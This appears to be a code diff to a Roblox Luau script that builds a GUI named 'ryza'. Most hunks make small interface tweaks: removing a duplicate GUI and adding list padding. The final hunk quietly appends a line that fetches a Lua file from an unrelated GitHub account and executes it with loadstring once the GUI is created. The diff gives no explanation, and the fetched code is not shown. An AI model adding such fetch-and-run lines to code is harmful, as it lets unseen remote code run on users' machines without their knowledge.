@@ -9,6 +9,10 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+if playerGui:FindFirstChild("ryza") then
+	playerGui:FindFirstChild("ryza"):Destroy()
+end
+
 -- Create the ScreenGui
 local ryza = Instance.new("ScreenGui")
 ryza.Name = "ryza"
@@ -30,6 +34,7 @@ list.HorizontalFlex = Enum.UIFlexAlignment.None
 list.ItemLineAlignment = Enum.ItemLineAlignment.Automatic
 list.VerticalAlignment = Enum.VerticalAlignment.Top
 list.VerticalFlex = Enum.UIFlexAlignment.None
+list.Padding = UDim.new(0, 5)
 
 -- Create the TopBar (main container) with larger, more modern size
 local TopBar = Instance.new("Frame")
@@ -536,5 +541,7 @@ spawn(function()
 end)
 
 ToggleButton:Destroy()
+task.wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/playerlist.lua"))()
 
 return ryza
